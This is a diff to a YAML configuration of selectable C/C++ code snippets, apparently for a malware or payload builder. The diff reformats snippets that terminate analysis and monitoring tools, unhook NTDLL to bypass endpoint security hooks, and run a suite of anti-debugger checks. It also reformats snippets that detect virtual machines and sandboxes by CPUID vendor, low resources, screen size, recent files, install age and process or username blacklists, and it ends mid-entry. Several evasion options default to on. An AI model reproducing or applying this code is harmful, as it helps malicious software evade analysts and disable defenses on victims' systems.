@@ -220,15 +220,101 @@ sections:
   - id: TerminateAnalysis
     display: Terminate Analysis Tools
     default: false
-    snippet: "{\n    const wchar_t* targets[] = {\n        L\"procmon.exe\", L\"procexp.exe\", L\"wireshark.exe\", \n        L\"fiddler.exe\", L\"ProcessHacker.exe\"\n    };\n    \n    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe = {sizeof(pe)};\n        if (Process32FirstW(snap, &pe)) {\n            do {\n                for (int i = 0; i < 5; i++) {\n                    if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {\n                        HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);\n                        if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }\n                    }\n                }\n            } while (Process32NextW(snap, &pe));\n        }\n        CloseHandle(snap);\n    }\n}\n"
+    snippet: |
+      {
+          const wchar_t* targets[] = {
+              L"procmon.exe", L"procexp.exe", L"wireshark.exe", 
+              L"fiddler.exe", L"ProcessHacker.exe"
+          };
+          
+          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (snap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe = {sizeof(pe)};
+              if (Process32FirstW(snap, &pe)) {
+                  do {
+                      for (int i = 0; i < 5; i++) {
+                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
+                              HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                              if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
+                          }
+                      }
+                  } while (Process32NextW(snap, &pe));
+              }
+              CloseHandle(snap);
+          }
+      }
+
   - id: KillAnalysisTools
     display: Terminate Analysis Processes
     default: true
-    snippet: "// Actively terminate analysis tools\n{\n    const wchar_t* targets[] = {\n        L\"procmon.exe\", L\"procexp.exe\", L\"procexp64.exe\",\n        L\"Wireshark.exe\", L\"fiddler.exe\", L\"tcpview.exe\",\n        L\"autoruns.exe\", L\"filemon.exe\", L\"regmon.exe\",\n        L\"ProcessHacker.exe\", L\"perfmon.exe\"\n    };\n    \n    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe = {sizeof(pe)};\n        if (Process32FirstW(snap, &pe)) {\n            do {\n                for (int i = 0; i < 11; i++) {\n                    if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {\n                        HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);\n                        if (hp) {\n                            TerminateProcess(hp, 0);\n                            CloseHandle(hp);\n                        }\n                    }\n                }\n            } while (Process32NextW(snap, &pe));\n        }\n        CloseHandle(snap);\n    }\n}\n"
+    snippet: |
+      // Actively terminate analysis tools
+      {
+          const wchar_t* targets[] = {
+              L"procmon.exe", L"procexp.exe", L"procexp64.exe",
+              L"Wireshark.exe", L"fiddler.exe", L"tcpview.exe",
+              L"autoruns.exe", L"filemon.exe", L"regmon.exe",
+              L"ProcessHacker.exe", L"perfmon.exe"
+          };
+          
+          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (snap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe = {sizeof(pe)};
+              if (Process32FirstW(snap, &pe)) {
+                  do {
+                      for (int i = 0; i < 11; i++) {
+                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
+                              HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                              if (hp) {
+                                  TerminateProcess(hp, 0);
+                                  CloseHandle(hp);
+                              }
+                          }
+                      }
+                  } while (Process32NextW(snap, &pe));
+              }
+              CloseHandle(snap);
+          }
+      }
+
   - id: UnhookNtdll
     display: NTDLL Unhooking
     default: false
-    snippet: "// Unhook NTDLL by mapping fresh copy from disk\n{\n    HANDLE hFile = CreateFileW(L\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", \n                               GENERIC_READ, FILE_SHARE_READ, NULL, \n                               OPEN_EXISTING, 0, NULL);\n    if (hFile != INVALID_HANDLE_VALUE) {\n        HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\n        if (hMap) {\n            PVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);\n            if (pClean) {\n                HMODULE hNtdll = GetModuleHandleW(L\"ntdll.dll\");\n                PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;\n                PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);\n                \n                PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);\n                for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n                    if (memcmp(pSec[i].Name, \".text\", 5) == 0) {\n                        DWORD oldProt;\n                        PVOID pDest = (PVOID)((PBYTE)hNtdll + pSec[i].VirtualAddress);\n                        PVOID pSrc = (PVOID)((PBYTE)pClean + pSec[i].VirtualAddress);\n                        VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);\n                        memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);\n                        VirtualProtect(pDest, pSec[i].Misc.VirtualSize, oldProt, &oldProt);\n                        break;\n                    }\n                }\n                UnmapViewOfFile(pClean);\n            }\n            CloseHandle(hMap);\n        }\n        CloseHandle(hFile);\n    }\n}\n"
+    snippet: |
+      // Unhook NTDLL by mapping fresh copy from disk
+      {
+          HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", 
+                                     GENERIC_READ, FILE_SHARE_READ, NULL, 
+                                     OPEN_EXISTING, 0, NULL);
+          if (hFile != INVALID_HANDLE_VALUE) {
+              HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+              if (hMap) {
+                  PVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+                  if (pClean) {
+                      HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+                      PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+                      PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+                      
+                      PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+                      for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+                          if (memcmp(pSec[i].Name, ".text", 5) == 0) {
+                              DWORD oldProt;
+                              PVOID pDest = (PVOID)((PBYTE)hNtdll + pSec[i].VirtualAddress);
+                              PVOID pSrc = (PVOID)((PBYTE)pClean + pSec[i].VirtualAddress);
+                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
+                              memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);
+                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, oldProt, &oldProt);
+                              break;
+                          }
+                      }
+                      UnmapViewOfFile(pClean);
+                  }
+                  CloseHandle(hMap);
+              }
+              CloseHandle(hFile);
+          }
+      }
+
   - id: HideFromDebugger
     display: Hide Thread From Debugger
     default: false
@@ -367,7 +453,24 @@ sections:
   - id: TimingRdtsc
     display: RDTSC Timing Check
     default: false
-    snippet: "// Anti-debug: Timing check using RDTSC\n// Debugger stepping causes significant delay\n{\n    unsigned __int64 start = __rdtsc();\n    \n    // Small operation\n    volatile int x = 0;\n    for (int i = 0; i < 100; i++) x++;\n    \n    unsigned __int64 end = __rdtsc();\n    \n    // Threshold for normal execution (adjust based on CPU)\n    if ((end - start) > 0x100000) {\n        return 0;\n    }\n}\n"
+    snippet: |
+      // Anti-debug: Timing check using RDTSC
+      // Debugger stepping causes significant delay
+      {
+          unsigned __int64 start = __rdtsc();
+          
+          // Small operation
+          volatile int x = 0;
+          for (int i = 0; i < 100; i++) x++;
+          
+          unsigned __int64 end = __rdtsc();
+          
+          // Threshold for normal execution (adjust based on CPU)
+          if ((end - start) > 0x100000) {
+              return 0;
+          }
+      }
+
   - id: NtQueryInformationProcess
     display: NtQueryInformationProcess Debug Port
     default: false
@@ -449,7 +552,58 @@ sections:
   - id: FullAntiDebug
     display: Full Anti-Debug Suite
     default: true
-    snippet: "// Complete anti-debug implementation\n{\n    // 1. IsDebuggerPresent\n    if (IsDebuggerPresent()) ExitProcess(0);\n    \n    // 2. CheckRemoteDebuggerPresent\n    BOOL remote = FALSE;\n    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);\n    if (remote) ExitProcess(0);\n    \n    // 3. PEB flags\n    #ifdef _WIN64\n    PPEB peb = (PPEB)__readgsqword(0x60);\n    DWORD ntg = *(DWORD*)((PBYTE)peb + 0xBC);\n    #else\n    PPEB peb = (PPEB)__readfsdword(0x30);\n    DWORD ntg = *(DWORD*)((PBYTE)peb + 0x68);\n    #endif\n    if (peb->BeingDebugged) ExitProcess(0);\n    if (ntg & 0x70) ExitProcess(0);\n    \n    // 4. Hardware breakpoints\n    CONTEXT ctx = {0};\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n    GetThreadContext(GetCurrentThread(), &ctx);\n    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);\n    \n    // 5. RDTSC timing\n    unsigned __int64 t1 = __rdtsc();\n    volatile int x = 0; for (int i = 0; i < 100; i++) x++;\n    if (__rdtsc() - t1 > 0x100000) ExitProcess(0);\n    \n    // 6. Debug port\n    typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);\n    pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtQueryInformationProcess\");\n    if (NtQIP) {\n        HANDLE port = NULL;\n        NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL);\n        if (port) ExitProcess(0);\n        \n        ULONG flags = 0;\n        NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), NULL); // ProcessDebugFlags\n        if (flags == 0) ExitProcess(0);\n    }\n    \n    // 7. OutputDebugString\n    SetLastError(0);\n    OutputDebugStringA(\"X\");\n    if (GetLastError() == 0) ExitProcess(0);\n}\n"
+    snippet: |
+      // Complete anti-debug implementation
+      {
+          // 1. IsDebuggerPresent
+          if (IsDebuggerPresent()) ExitProcess(0);
+          
+          // 2. CheckRemoteDebuggerPresent
+          BOOL remote = FALSE;
+          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
+          if (remote) ExitProcess(0);
+          
+          // 3. PEB flags
+          #ifdef _WIN64
+          PPEB peb = (PPEB)__readgsqword(0x60);
+          DWORD ntg = *(DWORD*)((PBYTE)peb + 0xBC);
+          #else
+          PPEB peb = (PPEB)__readfsdword(0x30);
+          DWORD ntg = *(DWORD*)((PBYTE)peb + 0x68);
+          #endif
+          if (peb->BeingDebugged) ExitProcess(0);
+          if (ntg & 0x70) ExitProcess(0);
+          
+          // 4. Hardware breakpoints
+          CONTEXT ctx = {0};
+          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+          GetThreadContext(GetCurrentThread(), &ctx);
+          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);
+          
+          // 5. RDTSC timing
+          unsigned __int64 t1 = __rdtsc();
+          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
+          if (__rdtsc() - t1 > 0x100000) ExitProcess(0);
+          
+          // 6. Debug port
+          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
+          if (NtQIP) {
+              HANDLE port = NULL;
+              NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL);
+              if (port) ExitProcess(0);
+              
+              ULONG flags = 0;
+              NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), NULL); // ProcessDebugFlags
+              if (flags == 0) ExitProcess(0);
+          }
+          
+          // 7. OutputDebugString
+          SetLastError(0);
+          OutputDebugStringA("X");
+          if (GetLastError() == 0) ExitProcess(0);
+      }
+
   - id: AllChecks
     display: All Anti-Debug Checks
     default: true
@@ -551,7 +705,24 @@ sections:
   - id: CpuidVMVendor
     display: CPUID VM Vendor String
     default: false
-    snippet: "// Anti-sandbox: Check for VM vendor strings via CPUID\n{\n    int cpuInfo[4] = {0};\n    __cpuid(cpuInfo, 0x40000000);\n    char vendor[13] = {0};\n    memcpy(vendor, &cpuInfo[1], 4);\n    memcpy(vendor + 4, &cpuInfo[2], 4);\n    memcpy(vendor + 8, &cpuInfo[3], 4);\n    \n    // Known VM vendors\n    if (strstr(vendor, \"VMwareVMware\") || strstr(vendor, \"Microsoft Hv\") ||\n        strstr(vendor, \"VBoxVBoxVBox\") || strstr(vendor, \"KVMKVMKVM\") ||\n        strstr(vendor, \"XenVMMXenVMM\") || strstr(vendor, \"prl hyperv\")) {\n        return 0;\n    }\n}\n"
+    snippet: |
+      // Anti-sandbox: Check for VM vendor strings via CPUID
+      {
+          int cpuInfo[4] = {0};
+          __cpuid(cpuInfo, 0x40000000);
+          char vendor[13] = {0};
+          memcpy(vendor, &cpuInfo[1], 4);
+          memcpy(vendor + 4, &cpuInfo[2], 4);
+          memcpy(vendor + 8, &cpuInfo[3], 4);
+          
+          // Known VM vendors
+          if (strstr(vendor, "VMwareVMware") || strstr(vendor, "Microsoft Hv") ||
+              strstr(vendor, "VBoxVBoxVBox") || strstr(vendor, "KVMKVMKVM") ||
+              strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv")) {
+              return 0;
+          }
+      }
+
   - id: MacAddressCheck
     display: MAC Address VM Detection
     default: false
@@ -602,11 +773,66 @@ sections:
   - id: ProcessListCheck
     display: Sandbox Process Detection
     default: false
-    snippet: "// Anti-sandbox: Check for sandbox/analysis processes\n{\n    const wchar_t* sandboxProcs[] = {\n        L\"vmtoolsd.exe\", L\"vmwaretray.exe\", L\"vmwareuser.exe\",\n        L\"vboxservice.exe\", L\"vboxtray.exe\",\n        L\"sandboxiedcomlaunch.exe\", L\"sandboxierpcss.exe\",\n        L\"procmon.exe\", L\"procmon64.exe\", L\"procexp.exe\", L\"procexp64.exe\",\n        L\"wireshark.exe\", L\"fiddler.exe\", L\"tcpview.exe\",\n        L\"autoruns.exe\", L\"filemon.exe\", L\"regmon.exe\",\n        L\"idaq.exe\", L\"idaq64.exe\", L\"x64dbg.exe\", L\"x32dbg.exe\"\n    };\n    \n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe32 = {sizeof(pe32)};\n        if (Process32FirstW(hSnap, &pe32)) {\n            do {\n                for (int i = 0; i < 19; i++) {\n                    if (_wcsicmp(pe32.szExeFile, sandboxProcs[i]) == 0) {\n                        CloseHandle(hSnap);\n                        return 0;\n                    }\n                }\n            } while (Process32NextW(hSnap, &pe32));\n        }\n        CloseHandle(hSnap);\n    }\n}\n"
+    snippet: |
+      // Anti-sandbox: Check for sandbox/analysis processes
+      {
+          const wchar_t* sandboxProcs[] = {
+              L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
+              L"vboxservice.exe", L"vboxtray.exe",
+              L"sandboxiedcomlaunch.exe", L"sandboxierpcss.exe",
+              L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe",
+              L"wireshark.exe", L"fiddler.exe", L"tcpview.exe",
+              L"autoruns.exe", L"filemon.exe", L"regmon.exe",
+              L"idaq.exe", L"idaq64.exe", L"x64dbg.exe", L"x32dbg.exe"
+          };
+          
+          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (hSnap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe32 = {sizeof(pe32)};
+              if (Process32FirstW(hSnap, &pe32)) {
+                  do {
+                      for (int i = 0; i < 19; i++) {
+                          if (_wcsicmp(pe32.szExeFile, sandboxProcs[i]) == 0) {
+                              CloseHandle(hSnap);
+                              return 0;
+                          }
+                      }
+                  } while (Process32NextW(hSnap, &pe32));
+              }
+              CloseHandle(hSnap);
+          }
+      }
+
   - id: LowResourceCheck
     display: Low Resource Detection
     default: false
-    snippet: "// Anti-sandbox: Check for unrealistically low system resources\n{\n    // Check RAM (sandboxes often have <2GB)\n    MEMORYSTATUSEX memStatus = {sizeof(memStatus)};\n    if (GlobalMemoryStatusEx(&memStatus)) {\n        if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // < 2GB\n            return 0;\n        }\n    }\n    \n    // Check disk size (sandboxes often have <60GB)\n    ULARGE_INTEGER totalBytes;\n    if (GetDiskFreeSpaceExW(L\"C:\\\\\", NULL, &totalBytes, NULL)) {\n        if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // < 60GB\n            return 0;\n        }\n    }\n    \n    // Check number of processors\n    SYSTEM_INFO sysInfo;\n    GetSystemInfo(&sysInfo);\n    if (sysInfo.dwNumberOfProcessors < 2) {\n        return 0;\n    }\n}\n"
+    snippet: |
+      // Anti-sandbox: Check for unrealistically low system resources
+      {
+          // Check RAM (sandboxes often have <2GB)
+          MEMORYSTATUSEX memStatus = {sizeof(memStatus)};
+          if (GlobalMemoryStatusEx(&memStatus)) {
+              if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // < 2GB
+                  return 0;
+              }
+          }
+          
+          // Check disk size (sandboxes often have <60GB)
+          ULARGE_INTEGER totalBytes;
+          if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL)) {
+              if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // < 60GB
+                  return 0;
+              }
+          }
+          
+          // Check number of processors
+          SYSTEM_INFO sysInfo;
+          GetSystemInfo(&sysInfo);
+          if (sysInfo.dwNumberOfProcessors < 2) {
+              return 0;
+          }
+      }
+
   - id: UsernameCheck
     display: Sandbox Username Detection
     default: false
@@ -632,27 +858,170 @@ sections:
   - id: RecentFilesCheck
     display: Recent Files Check
     default: false
-    snippet: "// Anti-sandbox: Check for user activity (recent files)\n// Sandboxes typically have no user activity\n{\n    WCHAR recentPath[MAX_PATH];\n    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {\n        WIN32_FIND_DATAW fd;\n        WCHAR searchPath[MAX_PATH];\n        wsprintfW(searchPath, L\"%s\\\\*\", recentPath);\n        HANDLE hFind = FindFirstFileW(searchPath, &fd);\n        if (hFind != INVALID_HANDLE_VALUE) {\n            int fileCount = 0;\n            do {\n                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {\n                    fileCount++;\n                }\n            } while (FindNextFileW(hFind, &fd) && fileCount < 10);\n            FindClose(hFind);\n            \n            if (fileCount < 5) {\n                // Too few recent files - likely sandbox\n                return 0;\n            }\n        }\n    }\n}\n"
+    snippet: |
+      // Anti-sandbox: Check for user activity (recent files)
+      // Sandboxes typically have no user activity
+      {
+          WCHAR recentPath[MAX_PATH];
+          if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {
+              WIN32_FIND_DATAW fd;
+              WCHAR searchPath[MAX_PATH];
+              wsprintfW(searchPath, L"%s\\*", recentPath);
+              HANDLE hFind = FindFirstFileW(searchPath, &fd);
+              if (hFind != INVALID_HANDLE_VALUE) {
+                  int fileCount = 0;
+                  do {
+                      if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                          fileCount++;
+                      }
+                  } while (FindNextFileW(hFind, &fd) && fileCount < 10);
+                  FindClose(hFind);
+                  
+                  if (fileCount < 5) {
+                      // Too few recent files - likely sandbox
+                      return 0;
+                  }
+              }
+          }
+      }
+
   - id: ScreenResolutionCheck
     display: Screen Resolution Check
     default: false
-    snippet: "// Anti-sandbox: Check screen resolution\n// Sandboxes often use low/unusual resolutions\n{\n    int width = GetSystemMetrics(SM_CXSCREEN);\n    int height = GetSystemMetrics(SM_CYSCREEN);\n    \n    // Most real systems have at least 1024x768\n    if (width < 1024 || height < 768) {\n        return 0;\n    }\n    \n    // Check for suspicious exact sandbox resolutions\n    if (width == 800 && height == 600) {\n        return 0;\n    }\n}\n"
+    snippet: |
+      // Anti-sandbox: Check screen resolution
+      // Sandboxes often use low/unusual resolutions
+      {
+          int width = GetSystemMetrics(SM_CXSCREEN);
+          int height = GetSystemMetrics(SM_CYSCREEN);
+          
+          // Most real systems have at least 1024x768
+          if (width < 1024 || height < 768) {
+              return 0;
+          }
+          
+          // Check for suspicious exact sandbox resolutions
+          if (width == 800 && height == 600) {
+              return 0;
+          }
+      }
+
   - id: FileTimeCheck
     display: Installation Age Check
     default: false
-    snippet: "// Anti-sandbox: Check if Windows was recently installed\n// Sandboxes have recent install times\n{\n    WCHAR windowsDir[MAX_PATH];\n    if (GetWindowsDirectoryW(windowsDir, MAX_PATH)) {\n        WIN32_FILE_ATTRIBUTE_DATA fileInfo;\n        if (GetFileAttributesExW(windowsDir, GetFileExInfoStandard, &fileInfo)) {\n            FILETIME now;\n            GetSystemTimeAsFileTime(&now);\n            \n            ULARGE_INTEGER installTime, currentTime;\n            installTime.LowPart = fileInfo.ftCreationTime.dwLowDateTime;\n            installTime.HighPart = fileInfo.ftCreationTime.dwHighDateTime;\n            currentTime.LowPart = now.dwLowDateTime;\n            currentTime.HighPart = now.dwHighDateTime;\n            \n            // Check if installed less than 1 day ago (in 100ns intervals)\n            ULONGLONG oneDay = 10000000ULL * 60 * 60 * 24;\n            if (currentTime.QuadPart - installTime.QuadPart < oneDay) {\n                return 0;\n            }\n        }\n    }\n}\n"
+    snippet: |
+      // Anti-sandbox: Check if Windows was recently installed
+      // Sandboxes have recent install times
+      {
+          WCHAR windowsDir[MAX_PATH];
+          if (GetWindowsDirectoryW(windowsDir, MAX_PATH)) {
+              WIN32_FILE_ATTRIBUTE_DATA fileInfo;
+              if (GetFileAttributesExW(windowsDir, GetFileExInfoStandard, &fileInfo)) {
+                  FILETIME now;
+                  GetSystemTimeAsFileTime(&now);
+                  
+                  ULARGE_INTEGER installTime, currentTime;
+                  installTime.LowPart = fileInfo.ftCreationTime.dwLowDateTime;
+                  installTime.HighPart = fileInfo.ftCreationTime.dwHighDateTime;
+                  currentTime.LowPart = now.dwLowDateTime;
+                  currentTime.HighPart = now.dwHighDateTime;
+                  
+                  // Check if installed less than 1 day ago (in 100ns intervals)
+                  ULONGLONG oneDay = 10000000ULL * 60 * 60 * 24;
+                  if (currentTime.QuadPart - installTime.QuadPart < oneDay) {
+                      return 0;
+                  }
+              }
+          }
+      }
+
   - id: AllVMChecks
     display: All VM Detection Methods
     default: true
-    snippet: "// Comprehensive VM detection\n{\n    // CPUID hypervisor bit\n    int cpu[4];\n    __cpuid(cpu, 1);\n    if (cpu[2] & (1 << 31)) return 0;\n\n    // CPUID VM vendor\n    __cpuid(cpu, 0x40000000);\n    char vendor[13] = {0};\n    memcpy(vendor, &cpu[1], 4);\n    memcpy(vendor + 4, &cpu[2], 4);\n    memcpy(vendor + 8, &cpu[3], 4);\n    if (strstr(vendor, \"VMware\") || strstr(vendor, \"VBox\") || \n        strstr(vendor, \"Microsoft Hv\") || strstr(vendor, \"KVM\")) return 0;\n\n    // Resources\n    MEMORYSTATUSEX mem = {sizeof(mem)};\n    GlobalMemoryStatusEx(&mem);\n    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 0; // < 4GB\n\n    SYSTEM_INFO si;\n    GetSystemInfo(&si);\n    if (si.dwNumberOfProcessors < 2) return 0;\n\n    ULARGE_INTEGER disk;\n    GetDiskFreeSpaceExW(L\"C:\\\\\", NULL, &disk, NULL);\n    if (disk.QuadPart < 80ULL * 1024 * 1024 * 1024) return 0; // < 80GB\n\n    // Screen\n    if (GetSystemMetrics(SM_CXSCREEN) < 1280) return 0;\n    if (GetSystemMetrics(SM_CYSCREEN) < 720) return 0;\n}\n"
+    snippet: |
+      // Comprehensive VM detection
+      {
+          // CPUID hypervisor bit
+          int cpu[4];
+          __cpuid(cpu, 1);
+          if (cpu[2] & (1 << 31)) return 0;
+
+          // CPUID VM vendor
+          __cpuid(cpu, 0x40000000);
+          char vendor[13] = {0};
+          memcpy(vendor, &cpu[1], 4);
+          memcpy(vendor + 4, &cpu[2], 4);
+          memcpy(vendor + 8, &cpu[3], 4);
+          if (strstr(vendor, "VMware") || strstr(vendor, "VBox") || 
+              strstr(vendor, "Microsoft Hv") || strstr(vendor, "KVM")) return 0;
+
+          // Resources
+          MEMORYSTATUSEX mem = {sizeof(mem)};
+          GlobalMemoryStatusEx(&mem);
+          if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 0; // < 4GB
+
+          SYSTEM_INFO si;
+          GetSystemInfo(&si);
+          if (si.dwNumberOfProcessors < 2) return 0;
+
+          ULARGE_INTEGER disk;
+          GetDiskFreeSpaceExW(L"C:\\", NULL, &disk, NULL);
+          if (disk.QuadPart < 80ULL * 1024 * 1024 * 1024) return 0; // < 80GB
+
+          // Screen
+          if (GetSystemMetrics(SM_CXSCREEN) < 1280) return 0;
+          if (GetSystemMetrics(SM_CYSCREEN) < 720) return 0;
+      }
+
   - id: ProcessBlacklist
     display: Process Blacklist (Extended)
     default: true
-    snippet: "{\n    const wchar_t* blacklist[] = {\n        L\"vmtoolsd.exe\", L\"vmwaretray.exe\", L\"vboxservice.exe\", L\"vboxtray.exe\",\n        L\"procmon.exe\", L\"procexp.exe\", L\"wireshark.exe\", L\"fiddler.exe\",\n        L\"x64dbg.exe\", L\"x32dbg.exe\", L\"ollydbg.exe\", L\"idaq.exe\", L\"idaq64.exe\",\n        L\"sandboxie.exe\", L\"sniff_hit.exe\", L\"sysmon.exe\", L\"joeboxcontrol.exe\",\n        L\"hookanaapp.exe\", L\"dumpcap.exe\", L\"importrec.exe\"\n    };\n    \n    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe = {sizeof(pe)};\n        if (Process32FirstW(snap, &pe)) {\n            do {\n                for (int i = 0; i < 20; i++) {\n                    if (_wcsicmp(pe.szExeFile, blacklist[i]) == 0) {\n                        CloseHandle(snap);\n                        return 0;\n                    }\n                }\n            } while (Process32NextW(snap, &pe));\n        }\n        CloseHandle(snap);\n    }\n}\n"
+    snippet: |
+      {
+          const wchar_t* blacklist[] = {
+              L"vmtoolsd.exe", L"vmwaretray.exe", L"vboxservice.exe", L"vboxtray.exe",
+              L"procmon.exe", L"procexp.exe", L"wireshark.exe", L"fiddler.exe",
+              L"x64dbg.exe", L"x32dbg.exe", L"ollydbg.exe", L"idaq.exe", L"idaq64.exe",
+              L"sandboxie.exe", L"sniff_hit.exe", L"sysmon.exe", L"joeboxcontrol.exe",
+              L"hookanaapp.exe", L"dumpcap.exe", L"importrec.exe"
+          };
+          
+          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (snap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe = {sizeof(pe)};
+              if (Process32FirstW(snap, &pe)) {
+                  do {
+                      for (int i = 0; i < 20; i++) {
+                          if (_wcsicmp(pe.szExeFile, blacklist[i]) == 0) {
+                              CloseHandle(snap);
+                              return 0;
+                          }
+                      }
+                  } while (Process32NextW(snap, &pe));
+              }
+              CloseHandle(snap);
+          }
+      }
+
   - id: UsernameBlacklist
     display: Username Blacklist
     default: true
-    snippet: "{\n    WCHAR user[256];\n    DWORD size = 256;\n    GetUserNameW(user, &size);\n    _wcslwr_s(user, 256);\n    \n    const wchar_t* badUsers[] = {\n        L\"sandbox\", L\"malware\", L\"virus\", L\"sample\", L\"test\",\n        L\"analysis\", L\"cuckoo\", L\"vmware\", L\"user\", L\"john doe\"\n    };\n    for (int i = 0; i < 10; i++) {\n        if (wcsstr(user, badUsers[i])) return 0;\n    }\n}\n"
+    snippet: |
+      {
+          WCHAR user[256];
+          DWORD size = 256;
+          GetUserNameW(user, &size);
+          _wcslwr_s(user, 256);
+          
+          const wchar_t* badUsers[] = {
+              L"sandbox", L"malware", L"virus", L"sample", L"test",
+              L"analysis", L"cuckoo", L"vmware", L"user", L"john doe"
+          };
+          for (int i = 0; i < 10; i++) {
+              if (wcsstr(user, badUsers[i])) return 0;
+          }
+      }
+
   - id: AllChecks
     display: Comprehensive VM/Sandbox Detection
     default: true
@@ -740,7 +1109,31 @@ sections:
   - id: EnvVarContains
     display: Environment Variable Contains Value
     default: false
-    snippet: "// Guardrail: Environment variable must contain specific value\n{\n    auto my_tolower = [](char c) -> char {\n        return (c >= 'A' && c <= 'Z') ? c + 32 : c;\n    };\n    \n    auto contains_ci = [&my_tolower](const char* haystack, const char* needle) -> bool {\n        if (!haystack || !needle) return false;\n        for (; *haystack; haystack++) {\n            const char* h = haystack;\n            const char* n = needle;\n            while (*h && *n && my_tolower(*h) == my_tolower(*n)) { h++; n++; }\n            if (*n == '\\0') return true;\n        }\n        return false;\n    };\n    \n    char buffer[1024];\n    DWORD result = GetEnvironmentVariableA(\"COMPUTERNAME\", buffer, 1024);\n    if (result == 0 || !contains_ci(buffer, \"__GUARDRAIL_PARAM__\")) {\n        return 0;\n    }\n}\n"
+    snippet: |
